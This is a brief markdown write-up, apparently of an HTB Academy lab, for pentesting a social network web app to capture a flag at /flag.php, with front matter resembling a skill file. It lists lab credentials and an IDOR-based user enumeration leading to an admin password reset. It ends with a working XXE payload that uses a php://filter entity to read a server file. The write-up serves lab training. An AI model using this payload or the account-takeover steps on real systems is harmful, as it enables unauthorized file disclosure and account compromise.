---
name: web-attack
description: Performing a web app pentest for sof comanpym and task y iwth testing
  the lastest of their social network web app.
---

# Scenario:
Performing a web app pentest for sof comanpym and task y iwth testing the lastest of their social network web app.
Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.

## 94.237.53.52:5948

##  Write up:

### Enumeration in caido
1. Log in the app with the creadentials:
- User htb-student
- Pass: Academy_student!

2. Login Requests in Caido:
- 301 redirect response following  a successful login.
- 200 ok resposne
- Api get

3. Potential IDOR:
We'll focus on the dir /api.php/user/74
![Automate](../Img/Web-attck-skill11.png)

![Automate](../Img/Web-attck-skill1.png)
Then we cam enumerate the users and find de admin user for login. We can chage the password in the dir /reset.php.
![Reset](../Img/Web-attck-skill3.png)
Now we can access to the admin user ---> PWD

4.Exploit with php filetering
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
<root>
  <name>&Test;</name>
  <details>test</details>
   <date></date>
</root>

```
![Flag](../Img/Web-attck-skill-flag.png)

![Flag](../Img/Web-attck-skill-flag-cy.png)

